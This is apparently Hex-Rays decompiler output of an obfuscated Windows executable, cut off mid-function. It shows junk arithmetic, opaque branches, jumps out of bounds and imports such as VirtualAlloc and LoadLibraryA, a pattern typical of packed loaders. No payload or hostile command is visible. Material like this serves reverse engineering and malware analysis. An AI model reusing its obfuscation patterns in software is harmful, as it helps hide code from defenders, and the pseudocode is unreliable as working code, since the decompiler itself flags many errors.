/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __fastcall sub_4015F7(int a1, int a2, int a3);
// void __usercall sub_401BFD(int a1@<eax>, int a2@<edx>);
void __stdcall sub_401D50(int a1);
// void __usercall sub_401E41(__int16 a1@<dx>, unsigned int a2@<ecx>, int a3@<esi>);
// int __userpurge sub_401FC6@<eax>(int a1@<eax>, int a2, int a3, int a4);
// void __usercall start(unsigned __int16 a1@<ax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>);
int __stdcall sub_40238F(int a1, int a2, int a3);
int __stdcall sub_4025F3(int a1, int a2, int a3);
void __fastcall sub_4026F8(unsigned int a1, __int16 a2);
void sub_402B2C();
void sub_402B32();
void __fastcall sub_402C40(__int16 a1, int a2);
int __fastcall sub_402E23(unsigned int ecx0, __int16 dx0, int a1, int a2, int a3, int a4);
// void __usercall sub_402F03(int a1@<eax>, int a2@<edx>, int a3@<ebp>);
// void __usercall sub_402F63(int a1@<eax>, int a2@<edx>, int a3@<ebp>);
int __stdcall sub_403146(int a1, int a2, int a3, int a4);
void sub_4033DF();
void __stdcall sub_403F1F(int a1, int a2);
int __fastcall sub_4041D8(unsigned int a1, __int16 a2, int a3);
// int __userpurge sub_40444C@<eax>(__int16 a1@<ax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, int a4);
int __stdcall sub_404657(int a1, int a2, int a3, int a4);
void __stdcall sub_404A0E(int a1, int a2, int a3, int a4);
int __thiscall sub_404A4A(void *this, int a2, int a3);
int __stdcall sub_404C0E(int a1);
int __fastcall sub_404F06(int a1, unsigned int a2, int a3);
// void __usercall sub_404F45(int a1@<eax>, int a2@<edx>);
void __stdcall sub_4055B4(int a1);
int __fastcall sub_40597F(int a1, int a2, int a3, int a4, int a5);
_BYTE *__cdecl sub_405E8D(_BYTE *a1, _BYTE *a2);
// int __usercall sub_406389@<eax>(int a1@<ebx>, int a2@<edi>, int a3);
unsigned int __cdecl sub_4064B4(_BYTE *a1);
int __cdecl sub_40675C(int a1, int a2, unsigned __int8 *a3);
// __int64 __usercall sub_406F23@<edx:eax>(unsigned __int8 a1@<dh>);
unsigned int __fastcall sub_406F6B(int a1, int a2);
// int __usercall sub_4075ED@<eax>(int a1@<ebx>, int a2@<edi>);
// void __usercall sub_40760F(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>);
// void __usercall sub_4076E8(void *a1@<eax>);
// int __usercall sub_407BF9@<eax>(int a1@<ecx>, int a2@<esi>);
int (__thiscall *sub_407D4B())(_DWORD, _DWORD, _DWORD, _DWORD);
// int (__stdcall *__usercall sub_407E84@<eax>(__int16 a1@<bx>, int a2@<edi>))(_DWORD, _DWORD, _DWORD, _DWORD);
unsigned __int8 __cdecl sub_408029(int a1, int a2, _BYTE *a3, unsigned int a4);
unsigned __int8 __cdecl sub_40855B(_BYTE *a1, unsigned int a2, int a3);
// int __usercall sub_40895D@<eax>(int a1@<edx>, char a2@<bh>);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// DWORD __stdcall GetCurrentThreadId();
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// LONG __stdcall InterlockedIncrement(volatile LONG *lpAddend);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_40A098; // weak
_UNKNOWN unk_40C1F2; // weak
_UNKNOWN unk_411EC2; // weak
_UNKNOWN unk_414F0F; // weak
_UNKNOWN unk_421CD6; // weak
_UNKNOWN unk_421DD6; // weak
int dword_43C004 = 0; // weak
int dword_43C008 = 0; // weak
int dword_43C00C = 0; // weak
int dword_43C010 = 0; // weak
int dword_43C014 = 0; // weak
int dword_43C018 = 0; // weak
int dword_43C01C = 0; // weak
int dword_43C020 = 0; // weak
int dword_43C024 = 0; // weak
int dword_43C028 = 0; // weak
int dword_43C02C = 0; // weak
int dword_43C030 = 0; // weak
int dword_43C034 = 0; // weak
int dword_43C038 = 0; // weak
int dword_43C03C = 0; // weak
int dword_43C040 = 0; // weak
int dword_43C044 = 0; // weak
int dword_43C048 = 0; // weak
int dword_43C04C = 0; // weak
int dword_43C0E0 = 0; // weak
char byte_43C124 = '\0'; // weak
int dword_43C264 = 4443720; // weak
_UNKNOWN loc_43C2B7; // weak
int dword_43C35C = 1136667661; // weak
_UNKNOWN dword_43C36C; // weak
int dword_43C3D0 = 1570; // weak
char byte_43C4B4 = 'Ú'; // weak
int dword_43C4DC = 1577058321; // weak
int dword_43C510 = 14535; // weak
char byte_43C540 = '»'; // weak
int dword_43C650 = -385858620; // weak
int dword_43C784 = -1017446400; // weak
char byte_43C78C = '\0'; // weak
int dword_43C7FC = 1136673797; // weak
char byte_43C87C = '‰'; // weak
int dword_43C8D0 = 1080688707; // weak
char byte_43C900 = '€'; // weak
int dword_43C968 = -2136276925; // weak
char byte_43C9C0 = '\0'; // weak
int dword_43CA20 = 1229408000; // weak
char byte_43CAD0 = 'C'; // weak
int dword_43CAEC = 808288512; // weak
char byte_43CB5C = '8'; // weak
int dword_43CBBC = -402653168; // weak
_UNKNOWN loc_43CD09; // weak
_UNKNOWN unk_43CE1C; // weak
void *off_43CEAC = &unk_43DA6C; // weak
char byte_43CF04 = '\0'; // weak
char byte_43CFC4 = '<'; // weak
int dword_43CFEC = -1962916903; // weak
char byte_43D024 = 'R'; // weak
int dword_43D098 = -2096839611; // weak
_UNKNOWN dword_43D160; // weak
int dword_43D274 = -266523904; // weak
int dword_43D330 = -2113929233; // weak
int dword_43D3BC = -1912602634; // weak
int dword_43D464 = -585761024; // weak
char byte_43D480 = '\x05'; // weak
int dword_43D494 = 2144502016; // weak
int dword_43D66C = -917438397; // weak
int dword_43D681 = 0; // weak
__int64 (__fastcall *dword_43D689)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_43D68D = 0; // weak
int (__stdcall *dword_43D691)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (*dword_43D695)(void) = NULL; // weak
int dword_43D6A5 = 0; // weak
int dword_43D6A9 = -123798841; // weak
int dword_43D6AD = 0; // weak
int dword_43D6B1 = 0; // weak
int dword_43D6C1 = 0; // weak
_UNKNOWN unk_43D6C5; // weak
int (__stdcall *dword_43D6D5)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_43D6DD)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_43D6E5)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_43D6F1)(_DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_43D6FD; // weak
int dword_43D703 = 88675123; // weak
int dword_43D707 = 0; // weak
_UNKNOWN dword_43D70B; // weak
int dword_43D710 = 0; // weak
int (__thiscall *dword_43D71B)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_43D723 = 521288629; // weak
int dword_43D7CC = 0; // weak
int dword_43D841 = 362436069; // weak
int dword_43D845 = 18044; // weak
int dword_43D849 = 7727; // weak
_UNKNOWN unk_43D84D; // weak
int dword_43D894 = 0; // weak
int dword_43D8F4 = 0; // weak
char byte_43D92C = '\0'; // weak
char byte_43D974 = '\0'; // weak
char byte_43DA48; // weak
int dword_43DA90; // weak
int dword_43DA9C; // weak


//----- (004015F7) --------------------------------------------------------
int __fastcall sub_4015F7(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // eax
  unsigned __int16 v5; // [esp+1A0h] [ebp-124h]
  int v6; // [esp+24Ch] [ebp-78h]

  v4 = (v5 + 6753) ^ 0x27EE;
  if ( v4 != a2 )
    goto LABEL_2;
  result = (((unsigned __int16)(v5 + 6753) ^ 0x1E21) - 437) & 0x3B5A;
  if ( (a2 & 0x23F1) != 0 )
  {
    v4 = result | 0xC78;
LABEL_2:
    result = (v6 & v4) - 12005;
  }
  return result;
}
// 4019AC: variable 'v6' is possibly undefined
// 403B9D: variable 'v5' is possibly undefined

//----- (00401BFD) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __usercall sub_401BFD(int a1@<eax>, int a2@<edx>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  sub_402F03(a1, a2, (int)&savedregs);
}
// 401C00: bad sp value at call

//----- (00401D50) --------------------------------------------------------
void __stdcall sub_401D50(int a1)
{
  ;
}

//----- (00401E41) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __usercall sub_401E41(__int16 a1@<dx>, unsigned int a2@<ecx>, int a3@<esi>)
{
  int v3; // edx
  int v4; // ecx
  unsigned int v5; // edx
  unsigned int v6; // ecx
  __int16 v7; // ax
  unsigned int v8; // eax
  bool v9; // cf
  int v10; // eax
  int v11; // ecx
  int v12; // edx
  int v13; // ecx
  int v14; // edx
  int v15; // ecx
  unsigned int v16; // ecx
  int v17; // edx
  int v18; // ecx
  int v19; // eax
  int v20; // edx
  int v21; // ecx
  int v22; // edx
  __int16 v23; // [esp+30h] [ebp-294h]
  int v24; // [esp+34h] [ebp-290h]
  int v25; // [esp+60h] [ebp-264h]
  int v26; // [esp+84h] [ebp-240h]
  int v27; // [esp+134h] [ebp-190h]
  char v28[4]; // [esp+1C0h] [ebp-104h] BYREF
  int v29; // [esp+1E4h] [ebp-E0h] BYREF
  int v30; // [esp+1E8h] [ebp-DCh]
  int v31; // [esp+210h] [ebp-B4h]
  int v32; // [esp+220h] [ebp-A4h]
  unsigned __int8 v33; // [esp+244h] [ebp-80h]
  int v34; // [esp+2A8h] [ebp-1Ch]
  int v35; // [esp+2C0h] [ebp-4h]

  sub_4026F8(a2, a1);
  sub_402B32();
  v31 += sub_4015F7(v15, v14, v15) | 0xE66;
  sub_402B2C();
  v34 &= sub_4015F7(v4, v3, v25);
  v7 = (v33 ^ 0x6EB) + 9047;
  if ( (v5 & 0x2F77) == 0 )
    v7 = (v33 ^ 0x6EB) + 16435;
  v8 = v7 & 0xF15;
  v30 += v8;
  v9 = v6 < v8;
  if ( v6 <= v8 )
  {
    v10 = v26 ^ v8 ^ 0x458;
    if ( v5 < v6 )
      goto LABEL_8;
    v9 = __PAIR64__(v10, v5) < (v6 | 0x179C00000000ui64);
    v8 = (__PAIR64__(v10, v5) - (v6 | 0x179C00000000i64)) >> 32;
  }
  v32 += v8 + v9;
LABEL_8:
  sub_402B2C();
  sub_40597F(0, v22, 0, 4, v27);
  sub_4025F3(18, 152760750, -1099327782);
  sub_402B32();
  sub_40597F(v21, v20, 0, 30, -1663769941);
  v19 = sub_4015F7(v18, v17, v24);
  sub_403F1F(12, v19);
  sub_402E23(v16, (__int16)v28, 56, (int)v28, (v23 & 0x3390 ^ 0x2E05) - 12171, 56);
  sub_402B32();
  sub_402B32();
  sub_402B2C();
  sub_407BF9(v11, a3);
  sub_4055B4((int)&v29);
  sub_4015F7(v13, v12, v13);
  v35 = dword_43D849;
  JUMPOUT(0x401D3C);
}
// 401D7F: control flows out of bounds to 401D3C
// 401D62: bad sp value at call
// 403120: variable 'v15' is possibly undefined
// 403120: variable 'v14' is possibly undefined
// 4019DF: variable 'v4' is possibly undefined
// 4019DF: variable 'v3' is possibly undefined
// 4019DF: variable 'v25' is possibly undefined
// 401A0C: variable 'v5' is possibly undefined
// 401AB7: variable 'v6' is possibly undefined
// 401ABF: variable 'v26' is possibly undefined
// 404E65: variable 'v22' is possibly undefined
// 404E65: variable 'v27' is possibly undefined
// 4046FC: variable 'v21' is possibly undefined
// 4046FC: variable 'v20' is possibly undefined
// 403A88: variable 'v18' is possibly undefined
// 403A88: variable 'v17' is possibly undefined
// 403A88: variable 'v24' is possibly undefined
// 403A4A: variable 'v16' is possibly undefined
// 403AA2: variable 'v23' is possibly undefined
// 401D56: variable 'v11' is possibly undefined
// 401D68: variable 'v13' is possibly undefined
// 401D68: variable 'v12' is possibly undefined
// 43D849: using guessed type int dword_43D849;

//----- (00401FC6) --------------------------------------------------------
int __userpurge sub_401FC6@<eax>(int a1@<eax>, int a2, int a3, int a4)
{
  return sub_4025F3(24, -815476790, a1);
}

//----- (0040205F) --------------------------------------------------------
void __usercall start(unsigned __int16 a1@<ax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>)
{
  char v6; // cf
  char v7; // cl
  int v8; // ecx
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // edx
  int v13; // esi
  int v14; // edx
  int v15; // eax
  int v16; // ecx
  int v17; // edx
  int v18; // ecx
  int v19; // ecx
  char v20[112]; // [esp+44h] [ebp-2FCh] BYREF
  int v21; // [esp+B4h] [ebp-28Ch]
  int v22; // [esp+FCh] [ebp-244h]
  int v23; // [esp+158h] [ebp-1E8h]
  int v24; // [esp+17Ch] [ebp-1C4h]
  int v25; // [esp+198h] [ebp-1A8h]
  unsigned __int16 v26; // [esp+20Ch] [ebp-134h]
  int v27; // [esp+228h] [ebp-118h]
  int v28; // [esp+29Ch] [ebp-A4h]
  int v29; // [esp+2DCh] [ebp-64h]
  int savedregs; // [esp+340h] [ebp+0h] BYREF

  if ( ((a1 ^ 0xB69) & 0x3089) != 0 )
  {
    if ( v24 == a2 )
    {
LABEL_4:
      sub_4055B4(dword_43CAEC);
      dword_43C044 = v15;
      v21 ^= 2 * v15;
      dword_43C034 -= 9689;
      sub_403F1F(58, 424553849);
      LOBYTE(v8) = BYTE1(v8) + v6 + v7;
      sub_4025F3(49, v17, v8);
      LOBYTE(v18) = byte_43C4B4;
      v16 = v6 + v18 + 7991;
      BYTE1(v16) = a4;
      unk_43D6C5 = a4;
      unk_43D84D = a6;
      dword_43D6A5 = a5;
      v13 = v12;
      dword_43D707 = v12;
      dword_43C014 -= dword_43C35C;
      dword_43D68D = v16;
      v14 = dword_43DA9C + __CFADD__(dword_43C8D0, 5463) + v12 + 29594;
      dword_43C010 = v13;
      LOBYTE(dword_43C014) = dword_43C014 - 61;
      dword_43D6C1 = (int)&savedregs;
      v11 = ((_WORD)dword_43C8D0 + 19703) & 0x1E14;
      v23 -= v11;
      v10 = v11 + 9476;
      if ( v10 >= v25 )
      {
        if ( (((v10 ^ 0x3CFA) + 9567) & v29) != 0
          || (v23 -= 5487, (v16 & v14) < 0 || (v9 = 2632 - v22, (v14 & 0xF31) == 0)) )
        {
LABEL_18:
          JUMPOUT(0x403FFB);
        }
        v27 += v9;
        if ( (v14 & v9) != 0 )
          JUMPOUT(0x4011AC);
        v10 = v26 + 17783;
      }
      v28 ^= v10 | 0x2E37;
      goto LABEL_18;
    }
    LOBYTE(dword_43C028) = dword_43C028 + 61;
    dword_43C038 = (int)v20;
    sub_4055B4((int)v20);
    a3 = v19 - dword_43D494;
    dword_43C02C = 30396;
  }
  dword_43C02C -= 400;
  dword_43C044 = a3;
  goto LABEL_4;
}
// 402EA5: control flows out of bounds to 403FFB
// 401780: control flows out of bounds to 4011AC
// 405784: variable 'v19' is possibly undefined
// 403AEC: variable 'v15' is possibly undefined
// 40115A: variable 'v8' is possibly undefined
// 40115A: variable 'v6' is possibly undefined
// 40115A: variable 'v7' is possibly undefined
// 40459D: variable 'v17' is possibly undefined
// 4045B4: variable 'v18' is possibly undefined
// 402782: variable 'v12' is possibly undefined
// 43C010: using guessed type int dword_43C010;
// 43C014: using guessed type int dword_43C014;
// 43C028: using guessed type int dword_43C028;
// 43C02C: using guessed type int dword_43C02C;
// 43C034: using guessed type int dword_43C034;
// 43C038: using guessed type int dword_43C038;
// 43C044: using guessed type int dword_43C044;
// 43C35C: using guessed type int dword_43C35C;
// 43C4B4: using guessed type char byte_43C4B4;
// 43C8D0: using guessed type int dword_43C8D0;
// 43CAEC: using guessed type int dword_43CAEC;
// 43D494: using guessed type int dword_43D494;
// 43D68D: using guessed type int dword_43D68D;
// 43D6A5: using guessed type int dword_43D6A5;
// 43D6C1: using guessed type int dword_43D6C1;
// 43D6DD: using guessed type int (__thiscall *dword_43D6DD)(_DWORD, _DWORD, _DWORD, _DWORD);
// 43D707: using guessed type int dword_43D707;
// 43DA9C: using guessed type int dword_43DA9C;

//----- (0040238F) --------------------------------------------------------
int __stdcall sub_40238F(int a1, int a2, int a3)
{
  __int16 v3; // ax
  unsigned int v4; // edx
  int v5; // ecx
  unsigned int v6; // edx
  int v7; // ecx
  unsigned int v8; // edx
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  int v12; // edx
  unsigned int v13; // edx
  unsigned int v14; // ecx
  int v16; // [esp+134h] [ebp-25Ch]
  int v17; // [esp+154h] [ebp-23Ch]
  __int16 v18; // [esp+214h] [ebp-17Ch]
  unsigned int v19; // [esp+218h] [ebp-178h]
  unsigned __int16 v20; // [esp+28Ch] [ebp-104h]
  __int16 v21; // [esp+28Ch] [ebp-104h]
  int v22; // [esp+29Ch] [ebp-F4h]

  sub_402B32();
  sub_4025F3(62, 868488551, v22);
  sub_404F06(v5, v4, -1357486836);
  sub_404F06(v9, v8, 1957445663);
  sub_404F06(v7, v6, v16);
  sub_402B32();
  sub_4025F3(60, v11, v10);
  sub_4025F3(44, v17, v12);
  v3 = -13856;
  v20 = v21 & 0xC9E0;
  if ( v19 < 0xFFFFC9E0 )
    goto LABEL_4;
  if ( v14 > v13 )
    goto LABEL_3;
  if ( (v14 & 0x26E6) == 0 && (v13 & 0x35A2) == 0 )
  {
    v3 = 2 * (v18 & 0xF4C);
LABEL_4:
    v3 ^= 0x1FB5u;
LABEL_3:
    v20 -= v3 ^ 0x89;
  }
  sub_402B32();
  return v20;
}
// 4043C0: variable 'v22' is possibly undefined
// 4027C9: variable 'v5' is possibly undefined
// 4027C9: variable 'v4' is possibly undefined
// 403200: variable 'v9' is possibly undefined
// 403200: variable 'v8' is possibly undefined
// 402CBF: variable 'v7' is possibly undefined
// 402CBF: variable 'v6' is possibly undefined
// 402CBF: variable 'v16' is possibly undefined
// 40414B: variable 'v11' is possibly undefined
// 40414B: variable 'v10' is possibly undefined
// 404159: variable 'v17' is possibly undefined
// 404159: variable 'v12' is possibly undefined
// 4019C0: variable 'v21' is possibly undefined
// 4019CC: variable 'v19' is possibly undefined
// 404227: variable 'v13' is possibly undefined
// 402490: variable 'v18' is possibly undefined
// 404944: variable 'v14' is possibly undefined

//----- (004025F3) --------------------------------------------------------
int __stdcall sub_4025F3(int a1, int a2, int a3)
{
  unsigned __int16 v4; // [esp+128h] [ebp-16Ch]
  int v5; // [esp+138h] [ebp-15Ch]

  return v5 + __CFADD__(v4 - 26149, v4 - 26149) + 2 * (v4 - 26149);
}
// 404CEE: variable 'v5' is possibly undefined
// 402B75: variable 'v4' is possibly undefined

//----- (004026F8) --------------------------------------------------------
void __fastcall sub_4026F8(unsigned int a1, __int16 a2)
{
  int v2; // eax
  int v3; // ecx
  int v4; // eax
  char v5; // cf
  unsigned int v6; // edx
  int v7; // ecx
  int v8; // [esp+18h] [ebp-31Ch]
  unsigned __int16 v9; // [esp+7Ch] [ebp-2B8h]
  char v10[72]; // [esp+98h] [ebp-29Ch] BYREF
  int v11; // [esp+10Ch] [ebp-228h]
  int v12; // [esp+178h] [ebp-1BCh]
  unsigned __int16 v13; // [esp+1A4h] [ebp-190h]
  int v14; // [esp+1D8h] [ebp-15Ch]
  int v15; // [esp+228h] [ebp-10Ch]
  unsigned __int8 v16; // [esp+288h] [ebp-ACh]
  int v17; // [esp+2A8h] [ebp-8Ch]
  int v18; // [esp+304h] [ebp-30h]
  int v19; // [esp+320h] [ebp-14h]
  int v20; // [esp+324h] [ebp-10h]
  unsigned int v21; // [esp+32Ch] [ebp-8h]

  sub_4041D8(a1, a2, (int)v10);
  sub_40238F(0, 58, 64);
  v15 ^= v9;
  v17 -= v9;
  sub_402B2C();
  v4 = (v8 + ((2 * v13) ^ 0x1C0D)) ^ 0x1734;
  if ( v3 >= v4 )
    v4 = 0;
  v18 += v4 ^ 0x3D30;
  sub_4025F3(19, v11, v20);
  sub_402B2C();
  sub_403F1F(63, v12);
  v19 &= -v5;
  if ( (((8322 - v5) | 0x409) & v7) == 0 || v21 < v6 || v16 + 13663 != v14 || (v2 = 7523, v6 == v7) )
    v2 = 0;
  sub_4025F3(58, v6, v2);
  sub_402B32();
}
// 40196B: variable 'v9' is possibly undefined
// 4048D4: variable 'v8' is possibly undefined
// 4014B5: variable 'v6' is possibly undefined
// 4014B5: variable 'v7' is possibly undefined
// 40458A: variable 'v3' is possibly undefined
// 40521B: variable 'v5' is possibly undefined

//----- (00402B2C) --------------------------------------------------------
void sub_402B2C()
{
  JUMPOUT(0x404018);
}
// 402B2D: control flows out of bounds to 404018

//----- (00402B32) --------------------------------------------------------
void sub_402B32()
{
  JUMPOUT(0x4024C1);
}
// 40531A: control flows out of bounds to 4024C1

//----- (00402C40) --------------------------------------------------------
void __fastcall sub_402C40(__int16 a1, int a2)
{
  __int16 v2; // dx
  unsigned int v3; // ecx
  int v4; // ecx
  int v5; // [esp-2ACh] [ebp-2B0h]
  int v6; // [esp-104h] [ebp-108h] BYREF

  sub_4015F7(a1, a2, -902152496);
  sub_4041D8(v3, v2, (int)&v6);
  LOBYTE(dword_43C04C) = dword_43C04C + 10;
  LOBYTE(v4) = v4 + 16;
  sub_406F6B(v4, dword_43D6B1);
  dword_43C010 -= 16580;
  dword_43C044 -= v5;
  dword_43C034 = 22030;
  dword_43C018 += 22030;
  __asm { retn }
}
// 40257A: variable 'v3' is possibly undefined
// 40257A: variable 'v2' is possibly undefined
// 407C34: variable 'v4' is possibly undefined
// 407196: variable 'v5' is possibly undefined
// 43C010: using guessed type int dword_43C010;
// 43C018: using guessed type int dword_43C018;
// 43C034: using guessed type int dword_43C034;
// 43C044: using guessed type int dword_43C044;
// 43C04C: using guessed type int dword_43C04C;
// 43D681: using guessed type int dword_43D681;
// 43D6A9: using guessed type int dword_43D6A9;
// 43D6B1: using guessed type int dword_43D6B1;

//----- (00402E23) --------------------------------------------------------
int __fastcall sub_402E23(unsigned int ecx0, __int16 dx0, int a1, int a2, int a3, int a4)
{
  int v6; // edx
  __int16 v7; // ax
  int v8; // edx
  __int16 v9; // dx
  unsigned int v10; // ecx
  char v11; // cf
  int v12; // eax
  int v14; // edx
  int v15; // ecx
  unsigned __int16 v16; // [esp+200h] [ebp-19Ch]

  sub_4026F8(ecx0, dx0);
  v7 = sub_4025F3(55, v6, 683011885);
  sub_401BFD((2 * v7) & 0x378F, v8);
  sub_4026F8(v10, v9);
  sub_401BFD(v12 + v11 + v12 + 15138, v14);
  sub_403F1F(4, v15);
  return v16 | 0x27BB;
}
// 402842: variable 'v6' is possibly undefined
// 402851: variable 'v8' is possibly undefined
// 40285D: variable 'v10' is possibly undefined
// 40285D: variable 'v9' is possibly undefined
// 402862: variable 'v12' is possibly undefined
// 402862: variable 'v11' is possibly undefined
// 403846: variable 'v14' is possibly undefined
// 405A9D: variable 'v15' is possibly undefined
// 405AA2: variable 'v16' is possibly undefined

//----- (00402F03) --------------------------------------------------------
void __usercall sub_402F03(int a1@<eax>, int a2@<edx>, int a3@<ebp>)
{
  int v3; // eax
  __int16 v4; // dx
  __int16 v5; // cx
  int v6; // eax
  int v7; // eax
  __int16 v8; // dx
  unsigned int v9; // ecx
  int v10; // eax

  *(_DWORD *)(a3 - 544) -= a1 ^ 0x3820;
  if ( (a2 & 0x1C10) != 0 )
  {
    v6 = *(unsigned __int16 *)(a3 - 176);
    *(_DWORD *)(a3 - 180) ^= v6;
    v7 = (((unsigned __int16)v6 ^ 0x185) - 5887) & 0x2B9B;
    if ( (a2 & *(_DWORD *)(a3 - 608)) >= 0 )
      v7 = (v7 & 0xE79) + 12044;
    *(_DWORD *)(a3 - 268) &= v7 | 0xD26;
  }
  sub_4055B4(a3 - 580);
  v3 = *(unsigned __int16 *)(a3 - 368) + 15305;
  if ( (v4 & 0x785) == 0 )
  {
    if ( (v5 & 0x12F4) != 0 )
    {
LABEL_4:
      sub_403F1F(32, v3);
      *(_DWORD *)(a3 - 804) -= v10 ^ 0x1851;
      sub_4026F8(v9, v8);
      *(_DWORD *)(a3 - 804) += *(unsigned __int16 *)(a3 - 108) ^ 0x38E3;
      JUMPOUT(0x40400C);
    }
    LOWORD(v3) = *(_WORD *)(a3 - 368) + 29808;
  }
  v3 &= 0xAB0u;
  goto LABEL_4;
}
// 401037: control flows out of bounds to 40402F
// 404427: control flows out of bounds to 40400C
// 4056FB: variable 'v10' is possibly undefined
// 404403: variable 'v9' is possibly undefined
// 404403: variable 'v8' is possibly undefined
// 4052D8: variable 'v4' is possibly undefined
// 401D8D: variable 'v5' is possibly undefined

//----- (00402F63) --------------------------------------------------------
void __usercall sub_402F63(int a1@<eax>, int a2@<edx>, int a3@<ebp>)
{
  int v3; // eax
  int v4; // eax

  v3 = a1 - 4877;
  *(_DWORD *)(a3 - 236) ^= v3;
  *(_DWORD *)(a3 - 532) ^= v3;
  if ( (v3 & 0x2E21) != 0 || (v4 = v3 + 2585, a2 >= *(_DWORD *)(a3 - 168)) )
    v4 = -2449;
  *(_DWORD *)(a3 - 472) &= v4;
  JUMPOUT(0x402B66);
}
// 40223C: control flows out of bounds to 403F34
// 402883: control flows out of bounds to 402B66

//----- (00403146) --------------------------------------------------------
int __stdcall sub_403146(int a1, int a2, int a3, int a4)
{
  __int16 v4; // dx
  int v5; // edx
  char v7[56]; // [esp+70h] [ebp-258h] BYREF
  char v8[48]; // [esp+258h] [ebp-70h] BYREF
  int v9; // [esp+288h] [ebp-40h]

  sub_402B32();
  sub_4055B4((int)v8);
  sub_4025F3(45, 439487292, v9);
  sub_4041D8((unsigned int)v7, v4, (int)v7);
  sub_4025F3(14, -271555128, v5);
  return 0;
}
// 4034CE: variable 'v4' is possibly undefined
// 4034E5: variable 'v5' is possibly undefined

//----- (004033DF) --------------------------------------------------------
void sub_4033DF()
{
  ;
}

//----- (00403F1F) --------------------------------------------------------
void __stdcall sub_403F1F(int a1, int a2)
{
  unsigned int v2; // edx
  int v3; // ecx
  unsigned int v4; // edx
  int v5; // ecx
  int v6; // [esp+24Ch] [ebp-1ACh]

  sub_402B2C();
  sub_404F06(v3, v2, v6);
  sub_404F06(v5, v4, 958538216);
  sub_402B32();
}
// 4040BD: variable 'v3' is possibly undefined
// 4040BD: variable 'v2' is possibly undefined
// 4040BD: variable 'v6' is possibly undefined
// 4040C7: variable 'v5' is possibly undefined
// 4040C7: variable 'v4' is possibly undefined

//----- (004041D8) --------------------------------------------------------
int __fastcall sub_4041D8(unsigned int a1, __int16 a2, int a3)
{
  int result; // eax
  unsigned __int8 v4; // [esp+28h] [ebp-1CCh]

  if ( (a2 & 0x24F9) != 0 || (result = -4942, a1 <= 0xFFFFECB2) )
    result = v4;
  return result;
}
// 401A77: variable 'v4' is possibly undefined

//----- (0040444C) --------------------------------------------------------
int __userpurge sub_40444C@<eax>(__int16 a1@<ax>, unsigned int a2@<edx>, unsigned int a3@<ecx>, int a4)
{
  int result; // eax
  unsigned int v5; // eax
  int v6; // ecx
  int v7; // eax
  __int16 v8; // ax
  int v9; // eax
  unsigned int v10; // eax
  bool v11; // cf
  unsigned int v12; // [esp+58h] [ebp-338h]
  int v13; // [esp+5Ch] [ebp-334h]
  unsigned __int16 v14; // [esp+68h] [ebp-328h]
  __int16 v15[32]; // [esp+78h] [ebp-318h] BYREF
  int v16; // [esp+B8h] [ebp-2D8h]
  int v17; // [esp+BCh] [ebp-2D4h]
  int v18; // [esp+110h] [ebp-280h]
  int v19; // [esp+1D4h] [ebp-1BCh]
  int v20; // [esp+1D8h] [ebp-1B8h]
  int v21; // [esp+1F8h] [ebp-198h]
  int v22; // [esp+25Ch] [ebp-134h]
  unsigned __int16 v23; // [esp+2A4h] [ebp-ECh]
  int v24; // [esp+2C4h] [ebp-CCh]
  unsigned __int16 v25; // [esp+36Ch] [ebp-24h]
  int v26; // [esp+38Ch] [ebp-4h]

  v7 = a1 & 0x1765;
  if ( a3 >= a2 )
    v7 = v18 + (((unsigned __int16)v7 ^ 0x1B5) & 0x1528);
  v26 ^= v7;
  v9 = v7 - 15803 + 14117;
  v19 |= v9;
  v10 = ((v9 - 8648) ^ 0xC33) - v16;
  v11 = 0;
  if ( (a3 & v16) == 0 )
  {
    v10 = ((__PAIR64__(v10 - 2804, v10) - 0x71E00000AF4i64) >> 32) + 11629;
    v11 = __CFADD__(v10, 6889);
    LOWORD(v10) = v10 + 6889;
  }
  v8 = v10 - (v11 + 11323);
  if ( (v8 & 0x738) != 0 || v23 - 2814 != a2 )
    v17 ^= 0x3E7Du;
  sub_4055B4((int)v15);
  if ( v6 != 13387 || v13 != 13387 )
    goto LABEL_16;
  v5 = 2 * (2 * (v20 + v25) + 13995);
